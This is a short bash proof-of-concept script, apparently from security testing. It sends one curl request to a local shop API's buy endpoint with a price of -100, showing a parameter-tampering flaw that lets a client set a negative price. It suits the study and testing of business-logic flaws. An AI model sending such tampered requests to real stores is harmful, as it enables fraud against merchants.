#!/bin/bash
# PoC: Negative price manipulation
curl -s "http://localhost:7000/api/buy?price=-100&qty=1"
echo ""
